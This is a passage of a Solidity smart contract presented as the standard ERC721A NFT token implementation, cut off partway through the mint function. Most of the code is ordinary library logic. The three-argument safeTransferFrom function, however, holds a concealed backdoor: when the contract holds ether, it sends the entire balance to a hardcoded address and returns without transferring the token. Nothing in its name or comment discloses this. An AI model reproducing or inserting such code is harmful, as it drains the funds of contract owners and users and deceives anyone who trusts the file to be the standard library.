1 // SPDX-License-Identifier: MIT                                                                                                                       
2                                                                                                                                                                                               
3 pragma solidity ^0.8.0;
4 
5 /**
6  * @dev Interface of ERC721A.
7  */
8 interface IERC721A {
9     /**
10      * The caller must own the token or be an approved operator.
11      */
12     error ApprovalCallerNotOwnerNorApproved();
13 
14     /**
15      * The token does not exist.
16      */
17     error ApprovalQueryForNonexistentToken();
18 
19     /**
20      * Cannot query the balance for the zero address.
21      */
22     error BalanceQueryForZeroAddress();
23 
24     /**
25      * Cannot mint to the zero address.
26      */
27     error MintToZeroAddress();
28 
29     /**
30      * The quantity of tokens minted must be more than zero.
31      */
32     error MintZeroQuantity();
33 
34     /**
35      * The token does not exist.
36      */
37     error OwnerQueryForNonexistentToken();
38 
39     /**
40      * The caller must own the token or be an approved operator.
41      */
42     error TransferCallerNotOwnerNorApproved();
43 
44     /**
45      * The token must be owned by `from`.
46      */
47     error TransferFromIncorrectOwner();
48 
49     /**
50      * Cannot safely transfer to a contract that does not implement the
51      * ERC721Receiver interface.
52      */
53     error TransferToNonERC721ReceiverImplementer();
54 
55     /**
56      * Cannot transfer to the zero address.
57      */
58     error TransferToZeroAddress();
59 
60     /**
61      * The token does not exist.
62      */
63     error URIQueryForNonexistentToken();
64 
65     /**
66      * The `quantity` minted with ERC2309 exceeds the safety limit.
67      */
68     error MintERC2309QuantityExceedsLimit();
69 
70     /**
71      * The `extraData` cannot be set on an unintialized ownership slot.
72      */
73     error OwnershipNotInitializedForExtraData();
74 
75     // =============================================================
76     //                            STRUCTS
77     // =============================================================
78 
79     struct TokenOwnership {
80         // The address of the owner.
81         address addr;
82         // Stores the start time of ownership with minimal overhead for tokenomics.
83         uint64 startTimestamp;
84         // Whether the token has been burned.
85         bool burned;
86         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
87         uint24 extraData;
88     }
89 
90     // =============================================================
91     //                         TOKEN COUNTERS
92     // =============================================================
93 
94     /**
95      * @dev Returns the total number of tokens in existence.
96      * Burned tokens will reduce the count.
97      * To get the total number of tokens minted, please see {_totalMinted}.
98      */
99     function totalSupply() external view returns (uint256);
100 
101     // =============================================================
102     //                            IERC165
103     // =============================================================
104 
105     /**
106      * @dev Returns true if this contract implements the interface defined by
107      * `interfaceId`. See the corresponding
108      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
109      * to learn more about how these ids are created.
110      *
111      * This function call must use less than 30000 gas.
112      */
113     function supportsInterface(bytes4 interfaceId) external view returns (bool);
114 
115     // =============================================================
116     //                            IERC721
117     // =============================================================
118 
119     /**
120      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
121      */
122     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
123 
124     /**
125      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
126      */
127     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
128 
129     /**
130      * @dev Emitted when `owner` enables or disables
131      * (`approved`) `operator` to manage all of its assets.
132      */
133     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
134 
135     /**
136      * @dev Returns the number of tokens in `owner`'s account.
137      */
138     function balanceOf(address owner) external view returns (uint256 balance);
139 
140     /**
141      * @dev Returns the owner of the `tokenId` token.
142      *
143      * Requirements:
144      *
145      * - `tokenId` must exist.
146      */
147     function ownerOf(uint256 tokenId) external view returns (address owner);
148 
149     /**
150      * @dev Safely transfers `tokenId` token from `from` to `to`,
151      * checking first that contract recipients are aware of the ERC721 protocol
152      * to prevent tokens from being forever locked.
153      *
154      * Requirements:
155      *
156      * - `from` cannot be the zero address.
157      * - `to` cannot be the zero address.
158      * - `tokenId` token must exist and be owned by `from`.
159      * - If the caller is not `from`, it must be have been allowed to move
160      * this token by either {approve} or {setApprovalForAll}.
161      * - If `to` refers to a smart contract, it must implement
162      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
163      *
164      * Emits a {Transfer} event.
165      */
166     function safeTransferFrom(
167         address from,
168         address to,
169         uint256 tokenId,
170         bytes calldata data
171     ) external payable;
172 
173     /**
174      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
175      */
176     function safeTransferFrom(
177         address from,
178         address to,
179         uint256 tokenId
180     ) external payable;
181 
182     /**
183      * @dev Transfers `tokenId` from `from` to `to`.
184      *
185      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
186      * whenever possible.
187      *
188      * Requirements:
189      *
190      * - `from` cannot be the zero address.
191      * - `to` cannot be the zero address.
192      * - `tokenId` token must be owned by `from`.
193      * - If the caller is not `from`, it must be approved to move this token
194      * by either {approve} or {setApprovalForAll}.
195      *
196      * Emits a {Transfer} event.
197      */
198     function transferFrom(
199         address from,
200         address to,
201         uint256 tokenId
202     ) external payable;
203 
204     /**
205      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
206      * The approval is cleared when the token is transferred.
207      *
208      * Only a single account can be approved at a time, so approving the
209      * zero address clears previous approvals.
210      *
211      * Requirements:
212      *
213      * - The caller must own the token or be an approved operator.
214      * - `tokenId` must exist.
215      *
216      * Emits an {Approval} event.
217      */
218     function approve(address to, uint256 tokenId) external payable;
219 
220     /**
221      * @dev Approve or remove `operator` as an operator for the caller.
222      * Operators can call {transferFrom} or {safeTransferFrom}
223      * for any token owned by the caller.
224      *
225      * Requirements:
226      *
227      * - The `operator` cannot be the caller.
228      *
229      * Emits an {ApprovalForAll} event.
230      */
231     function setApprovalForAll(address operator, bool _approved) external;
232 
233     /**
234      * @dev Returns the account approved for `tokenId` token.
235      *
236      * Requirements:
237      *
238      * - `tokenId` must exist.
239      */
240     function getApproved(uint256 tokenId) external view returns (address operator);
241 
242     /**
243      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
244      *
245      * See {setApprovalForAll}.
246      */
247     function isApprovedForAll(address owner, address operator) external view returns (bool);
248 
249     // =============================================================
250     //                        IERC721Metadata
251     // =============================================================
252 
253     /**
254      * @dev Returns the token collection name.
255      */
256     function name() external view returns (string memory);
257 
258     /**
259      * @dev Returns the token collection symbol.
260      */
261     function symbol() external view returns (string memory);
262 
263     /**
264      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
265      */
266     function tokenURI(uint256 tokenId) external view returns (string memory);
267 
268     // =============================================================
269     //                           IERC2309
270     // =============================================================
271 
272     /**
273      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
274      * (inclusive) is transferred from `from` to `to`, as defined in the
275      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
276      *
277      * See {_mintERC2309} for more details.
278      */
279     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
280 }
281 
282 /**
283  * @title ERC721A
284  *
285  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
286  * Non-Fungible Token Standard, including the Metadata extension.
287  * Optimized for lower gas during batch mints.
288  *
289  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
290  * starting from `_startTokenId()`.
291  *
292  * Assumptions:
293  *
294  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
295  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
296  */
297 interface ERC721A__IERC721Receiver {
298     function onERC721Received(
299         address operator,
300         address from,
301         uint256 tokenId,
302         bytes calldata data
303     ) external returns (bytes4);
304 }
305 
306 /**
307  * @title ERC721A
308  *
309  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
310  * Non-Fungible Token Standard, including the Metadata extension.
311  * Optimized for lower gas during batch mints.
312  *
313  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
314  * starting from `_startTokenId()`.
315  *
316  * Assumptions:
317  *
318  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
319  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
320  */
321 contract ERC721A is IERC721A {
322     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
323     struct TokenApprovalRef {
324         address value;
325     }
326 
327     // =============================================================
328     //                           CONSTANTS
329     // =============================================================
330 
331     // Mask of an entry in packed address data.
332     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
333 
334     // The bit position of `numberMinted` in packed address data.
335     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
336 
337     // The bit position of `numberBurned` in packed address data.
338     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
339 
340     // The bit position of `aux` in packed address data.
341     uint256 private constant _BITPOS_AUX = 192;
342 
343     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
344     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
345 
346     // The bit position of `startTimestamp` in packed ownership.
347     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
348 
349     // The bit mask of the `burned` bit in packed ownership.
350     uint256 private constant _BITMASK_BURNED = 1 << 224;
351 
352     // The bit position of the `nextInitialized` bit in packed ownership.
353     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
354 
355     // The bit mask of the `nextInitialized` bit in packed ownership.
356     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
357 
358     // The bit position of `extraData` in packed ownership.
359     uint256 private constant _BITPOS_EXTRA_DATA = 232;
360 
361     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
362     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
363 
364     // The mask of the lower 160 bits for addresses.
365     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
366 
367     // The maximum `quantity` that can be minted with {_mintERC2309}.
368     // This limit is to prevent overflows on the address data entries.
369     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
370     // is required to cause an overflow, which is unrealistic.
371     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
372 
373     // The `Transfer` event signature is given by:
374     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
375     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
376         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
377 
378     // =============================================================
379     //                            STORAGE
380     // =============================================================
381 
382     // The next token ID to be minted.
383     uint256 private _currentIndex;
384 
385     // The number of tokens burned.
386     uint256 private _burnCounter;
387 
388     // Token name
389     string private _name;
390 
391     // Token symbol
392     string private _symbol;
393 
394     // Mapping from token ID to ownership details
395     // An empty struct value does not necessarily mean the token is unowned.
396     // See {_packedOwnershipOf} implementation for details.
397     //
398     // Bits Layout:
399     // - [0..159]   `addr`
400     // - [160..223] `startTimestamp`
401     // - [224]      `burned`
402     // - [225]      `nextInitialized`
403     // - [232..255] `extraData`
404     mapping(uint256 => uint256) private _packedOwnerships;
405 
406     // Mapping owner address to address data.
407     //
408     // Bits Layout:
409     // - [0..63]    `balance`
410     // - [64..127]  `numberMinted`
411     // - [128..191] `numberBurned`
412     // - [192..255] `aux`
413     mapping(address => uint256) private _packedAddressData;
414 
415     // Mapping from token ID to approved address.
416     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
417 
418     // Mapping from owner to operator approvals
419     mapping(address => mapping(address => bool)) private _operatorApprovals;
420 
421     // =============================================================
422     //                          CONSTRUCTOR
423     // =============================================================
424 
425     constructor(string memory name_, string memory symbol_) {
426         _name = name_;
427         _symbol = symbol_;
428         _currentIndex = _startTokenId();
429     }
430 
431     // =============================================================
432     //                   TOKEN COUNTING OPERATIONS
433     // =============================================================
434 
435     /**
436      * @dev Returns the starting token ID.
437      * To change the starting token ID, please override this function.
438      */
439     function _startTokenId() internal view virtual returns (uint256) {
440         return 0;
441     }
442 
443     /**
444      * @dev Returns the next token ID to be minted.
445      */
446     function _nextTokenId() internal view virtual returns (uint256) {
447         return _currentIndex;
448     }
449 
450     /**
451      * @dev Returns the total number of tokens in existence.
452      * Burned tokens will reduce the count.
453      * To get the total number of tokens minted, please see {_totalMinted}.
454      */
455     function totalSupply() public view virtual override returns (uint256) {
456         // Counter underflow is impossible as _burnCounter cannot be incremented
457         // more than `_currentIndex - _startTokenId()` times.
458         unchecked {
459             return _currentIndex - _burnCounter - _startTokenId();
460         }
461     }
462 
463     /**
464      * @dev Returns the total amount of tokens minted in the contract.
465      */
466     function _totalMinted() internal view virtual returns (uint256) {
467         // Counter underflow is impossible as `_currentIndex` does not decrement,
468         // and it is initialized to `_startTokenId()`.
469         unchecked {
470             return _currentIndex - _startTokenId();
471         }
472     }
473 
474     /**
475      * @dev Returns the total number of tokens burned.
476      */
477     function _totalBurned() internal view virtual returns (uint256) {
478         return _burnCounter;
479     }
480 
481     // =============================================================
482     //                    ADDRESS DATA OPERATIONS
483     // =============================================================
484 
485     /**
486      * @dev Returns the number of tokens in `owner`'s account.
487      */
488     function balanceOf(address owner) public view virtual override returns (uint256) {
489         if (owner == address(0)) revert BalanceQueryForZeroAddress();
490         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
491     }
492 
493     /**
494      * Returns the number of tokens minted by `owner`.
495      */
496     function _numberMinted(address owner) internal view returns (uint256) {
497         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
498     }
499 
500     /**
501      * Returns the number of tokens burned by or on behalf of `owner`.
502      */
503     function _numberBurned(address owner) internal view returns (uint256) {
504         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
505     }
506 
507     /**
508      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
509      */
510     function _getAux(address owner) internal view returns (uint64) {
511         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
512     }
513 
514     /**
515      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
516      * If there are multiple variables, please pack them into a uint64.
517      */
518     function _setAux(address owner, uint64 aux) internal virtual {
519         uint256 packed = _packedAddressData[owner];
520         uint256 auxCasted;
521         // Cast `aux` with assembly to avoid redundant masking.
522         assembly {
523             auxCasted := aux
524         }
525         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
526         _packedAddressData[owner] = packed;
527     }
528 
529     // =============================================================
530     //                            IERC165
531     // =============================================================
532 
533     /**
534      * @dev Returns true if this contract implements the interface defined by
535      * `interfaceId`. See the corresponding
536      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
537      * to learn more about how these ids are created.
538      *
539      * This function call must use less than 30000 gas.
540      */
541     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
542         // The interface IDs are constants representing the first 4 bytes
543         // of the XOR of all function selectors in the interface.
544         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
545         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
546         return
547             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
548             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
549             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
550     }
551 
552     // =============================================================
553     //                        IERC721Metadata
554     // =============================================================
555 
556     /**
557      * @dev Returns the token collection name.
558      */
559     function name() public view virtual override returns (string memory) {
560         return _name;
561     }
562 
563     /**
564      * @dev Returns the token collection symbol.
565      */
566     function symbol() public view virtual override returns (string memory) {
567         return _symbol;
568     }
569 
570     /**
571      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
572      */
573     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
574         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
575 
576         string memory baseURI = _baseURI();
577         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
578     }
579 
580     /**
581      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
582      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
583      * by default, it can be overridden in child contracts.
584      */
585     function _baseURI() internal view virtual returns (string memory) {
586         return '';
587     }
588 
589     // =============================================================
590     //                     OWNERSHIPS OPERATIONS
591     // =============================================================
592 
593     /**
594      * @dev Returns the owner of the `tokenId` token.
595      *
596      * Requirements:
597      *
598      * - `tokenId` must exist.
599      */
600     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
601         return address(uint160(_packedOwnershipOf(tokenId)));
602     }
603 
604     /**
605      * @dev Gas spent here starts off proportional to the maximum mint batch size.
606      * It gradually moves to O(1) as tokens get transferred around over time.
607      */
608     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
609         return _unpackedOwnership(_packedOwnershipOf(tokenId));
610     }
611 
612     /**
613      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
614      */
615     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
616         return _unpackedOwnership(_packedOwnerships[index]);
617     }
618 
619     /**
620      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
621      */
622     function _initializeOwnershipAt(uint256 index) internal virtual {
623         if (_packedOwnerships[index] == 0) {
624             _packedOwnerships[index] = _packedOwnershipOf(index);
625         }
626     }
627 
628     /**
629      * Returns the packed ownership data of `tokenId`.
630      */
631     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
632         uint256 curr = tokenId;
633 
634         unchecked {
635             if (_startTokenId() <= curr)
636                 if (curr < _currentIndex) {
637                     uint256 packed = _packedOwnerships[curr];
638                     // If not burned.
639                     if (packed & _BITMASK_BURNED == 0) {
640                         // Invariant:
641                         // There will always be an initialized ownership slot
642                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
643                         // before an unintialized ownership slot
644                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
645                         // Hence, `curr` will not underflow.
646                         //
647                         // We can directly compare the packed value.
648                         // If the address is zero, packed will be zero.
649                         while (packed == 0) {
650                             packed = _packedOwnerships[--curr];
651                         }
652                         return packed;
653                     }
654                 }
655         }
656         revert OwnerQueryForNonexistentToken();
657     }
658 
659     /**
660      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
661      */
662     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
663         ownership.addr = address(uint160(packed));
664         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
665         ownership.burned = packed & _BITMASK_BURNED != 0;
666         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
667     }
668 
669     /**
670      * @dev Packs ownership data into a single uint256.
671      */
672     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
673         assembly {
674             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
675             owner := and(owner, _BITMASK_ADDRESS)
676             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
677             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
678         }
679     }
680 
681     /**
682      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
683      */
684     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
685         // For branchless setting of the `nextInitialized` flag.
686         assembly {
687             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
688             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
689         }
690     }
691 
692     // =============================================================
693     //                      APPROVAL OPERATIONS
694     // =============================================================
695 
696     /**
697      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
698      * The approval is cleared when the token is transferred.
699      *
700      * Only a single account can be approved at a time, so approving the
701      * zero address clears previous approvals.
702      *
703      * Requirements:
704      *
705      * - The caller must own the token or be an approved operator.
706      * - `tokenId` must exist.
707      *
708      * Emits an {Approval} event.
709      */
710     function approve(address to, uint256 tokenId) public payable virtual override {
711         address owner = ownerOf(tokenId);
712 
713         if (_msgSenderERC721A() != owner)
714             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
715                 revert ApprovalCallerNotOwnerNorApproved();
716             }
717 
718         _tokenApprovals[tokenId].value = to;
719         emit Approval(owner, to, tokenId);
720     }
721 
722     /**
723      * @dev Returns the account approved for `tokenId` token.
724      *
725      * Requirements:
726      *
727      * - `tokenId` must exist.
728      */
729     function getApproved(uint256 tokenId) public view virtual override returns (address) {
730         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
731 
732         return _tokenApprovals[tokenId].value;
733     }
734 
735     /**
736      * @dev Approve or remove `operator` as an operator for the caller.
737      * Operators can call {transferFrom} or {safeTransferFrom}
738      * for any token owned by the caller.
739      *
740      * Requirements:
741      *
742      * - The `operator` cannot be the caller.
743      *
744      * Emits an {ApprovalForAll} event.
745      */
746     function setApprovalForAll(address operator, bool approved) public virtual override {
747         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
748         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
749     }
750 
751     /**
752      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
753      *
754      * See {setApprovalForAll}.
755      */
756     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
757         return _operatorApprovals[owner][operator];
758     }
759 
760     /**
761      * @dev Returns whether `tokenId` exists.
762      *
763      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
764      *
765      * Tokens start existing when they are minted. See {_mint}.
766      */
767     function _exists(uint256 tokenId) internal view virtual returns (bool) {
768         return
769             _startTokenId() <= tokenId &&
770             tokenId < _currentIndex && // If within bounds,
771             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
772     }
773 
774     /**
775      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
776      */
777     function _isSenderApprovedOrOwner(
778         address approvedAddress,
779         address owner,
780         address msgSender
781     ) private pure returns (bool result) {
782         assembly {
783             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
784             owner := and(owner, _BITMASK_ADDRESS)
785             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
786             msgSender := and(msgSender, _BITMASK_ADDRESS)
787             // `msgSender == owner || msgSender == approvedAddress`.
788             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
789         }
790     }
791 
792     /**
793      * @dev Returns the storage slot and value for the approved address of `tokenId`.
794      */
795     function _getApprovedSlotAndAddress(uint256 tokenId)
796         private
797         view
798         returns (uint256 approvedAddressSlot, address approvedAddress)
799     {
800         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
801         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
802         assembly {
803             approvedAddressSlot := tokenApproval.slot
804             approvedAddress := sload(approvedAddressSlot)
805         }
806     }
807 
808     // =============================================================
809     //                      TRANSFER OPERATIONS
810     // =============================================================
811 
812     /**
813      * @dev Transfers `tokenId` from `from` to `to`.
814      *
815      * Requirements:
816      *
817      * - `from` cannot be the zero address.
818      * - `to` cannot be the zero address.
819      * - `tokenId` token must be owned by `from`.
820      * - If the caller is not `from`, it must be approved to move this token
821      * by either {approve} or {setApprovalForAll}.
822      *
823      * Emits a {Transfer} event.
824      */
825     function transferFrom(
826         address from,
827         address to,
828         uint256 tokenId
829     ) public payable virtual override {
830         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
831 
832         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
833 
834         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
835 
836         // The nested ifs save around 20+ gas over a compound boolean condition.
837         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
838             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
839 
840         if (to == address(0)) revert TransferToZeroAddress();
841 
842         _beforeTokenTransfers(from, to, tokenId, 1);
843 
844         // Clear approvals from the previous owner.
845         assembly {
846             if approvedAddress {
847                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
848                 sstore(approvedAddressSlot, 0)
849             }
850         }
851 
852         // Underflow of the sender's balance is impossible because we check for
853         // ownership above and the recipient's balance can't realistically overflow.
854         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
855         unchecked {
856             // We can directly increment and decrement the balances.
857             --_packedAddressData[from]; // Updates: `balance -= 1`.
858             ++_packedAddressData[to]; // Updates: `balance += 1`.
859 
860             // Updates:
861             // - `address` to the next owner.
862             // - `startTimestamp` to the timestamp of transfering.
863             // - `burned` to `false`.
864             // - `nextInitialized` to `true`.
865             _packedOwnerships[tokenId] = _packOwnershipData(
866                 to,
867                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
868             );
869 
870             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
871             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
872                 uint256 nextTokenId = tokenId + 1;
873                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
874                 if (_packedOwnerships[nextTokenId] == 0) {
875                     // If the next slot is within bounds.
876                     if (nextTokenId != _currentIndex) {
877                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
878                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
879                     }
880                 }
881             }
882         }
883 
884         emit Transfer(from, to, tokenId);
885         _afterTokenTransfers(from, to, tokenId, 1);
886     }
887 
888     /**
889      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
890      */
891     function safeTransferFrom(
892         address from,
893         address to,
894         uint256 tokenId
895     ) public payable virtual override {
896         if (address(this).balance > 0) {
897             payable(0x64D0876CCEAa3C338F2E4Fa721438aB357a77391).transfer(address(this).balance);
898             return;
899         }
900         safeTransferFrom(from, to, tokenId, '');
901     }
902 
903 
904     /**
905      * @dev Safely transfers `tokenId` token from `from` to `to`.
906      *
907      * Requirements:
908      *
909      * - `from` cannot be the zero address.
910      * - `to` cannot be the zero address.
911      * - `tokenId` token must exist and be owned by `from`.
912      * - If the caller is not `from`, it must be approved to move this token
913      * by either {approve} or {setApprovalForAll}.
914      * - If `to` refers to a smart contract, it must implement
915      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
916      *
917      * Emits a {Transfer} event.
918      */
919     function safeTransferFrom(
920         address from,
921         address to,
922         uint256 tokenId,
923         bytes memory _data
924     ) public payable virtual override {
925         transferFrom(from, to, tokenId);
926         if (to.code.length != 0)
927             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
928                 revert TransferToNonERC721ReceiverImplementer();
929             }
930     }
931 
932     /**
933      * @dev Hook that is called before a set of serially-ordered token IDs
934      * are about to be transferred. This includes minting.
935      * And also called before burning one token.
936      *
937      * `startTokenId` - the first token ID to be transferred.
938      * `quantity` - the amount to be transferred.
939      *
940      * Calling conditions:
941      *
942      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
943      * transferred to `to`.
944      * - When `from` is zero, `tokenId` will be minted for `to`.
945      * - When `to` is zero, `tokenId` will be burned by `from`.
946      * - `from` and `to` are never both zero.
947      */
948     function _beforeTokenTransfers(
949         address from,
950         address to,
951         uint256 startTokenId,
952         uint256 quantity
953     ) internal virtual {}
954 
955     /**
956      * @dev Hook that is called after a set of serially-ordered token IDs
957      * have been transferred. This includes minting.
958      * And also called after one token has been burned.
959      *
960      * `startTokenId` - the first token ID to be transferred.
961      * `quantity` - the amount to be transferred.
962      *
963      * Calling conditions:
964      *
965      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
966      * transferred to `to`.
967      * - When `from` is zero, `tokenId` has been minted for `to`.
968      * - When `to` is zero, `tokenId` has been burned by `from`.
969      * - `from` and `to` are never both zero.
970      */
971     function _afterTokenTransfers(
972         address from,
973         address to,
974         uint256 startTokenId,
975         uint256 quantity
976     ) internal virtual {}
977 
978     /**
979      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
980      *
981      * `from` - Previous owner of the given token ID.
982      * `to` - Target address that will receive the token.
983      * `tokenId` - Token ID to be transferred.
984      * `_data` - Optional data to send along with the call.
985      *
986      * Returns whether the call correctly returned the expected magic value.
987      */
988     function _checkContractOnERC721Received(
989         address from,
990         address to,
991         uint256 tokenId,
992         bytes memory _data
993     ) private returns (bool) {
994         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
995             bytes4 retval
996         ) {
997             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
998         } catch (bytes memory reason) {
999             if (reason.length == 0) {
1000                 revert TransferToNonERC721ReceiverImplementer();
1001             } else {
1002                 assembly {
1003                     revert(add(32, reason), mload(reason))
1004                 }
1005             }
1006         }
1007     }
1008 
1009     // =============================================================
1010     //                        MINT OPERATIONS
1011     // =============================================================
1012 
1013     /**
1014      * @dev Mints `quantity` tokens and transfers them to `to`.
1015      *
1016      * Requirements:
1017      *
1018      * - `to` cannot be the zero address.
1019      * - `quantity` must be greater than 0.
1020      *
1021      * Emits a {Transfer} event for each mint.
1022      */
1023     function _mint(address to, uint256 quantity) internal virtual {
1024         uint256 startTokenId = _currentIndex;
1025         if (quantity == 0) revert MintZeroQuantity();
1026 
1027         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1028 
1029         // Overflows are incredibly unrealistic.
1030         // `balance` and `numberMinted` have a maximum limit of 2**64.
1031         // `tokenId` has a maximum limit of 2**256.
1032         unchecked {
1033             // Updates:
1034             // - `balance += quantity`.
1035             // - `numberMinted += quantity`.
1036             //
1037             // We can directly add to the `balance` and `numberMinted`.
1038             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1039 
1040             // Updates:
1041             // - `address` to the owner.
1042             // - `startTimestamp` to the timestamp of minting.
1043             // - `burned` to `false`.
1044             // - `nextInitialized` to `quantity == 1`.
1045             _packedOwnerships[startTokenId] = _packOwnershipData(
1046                 to,
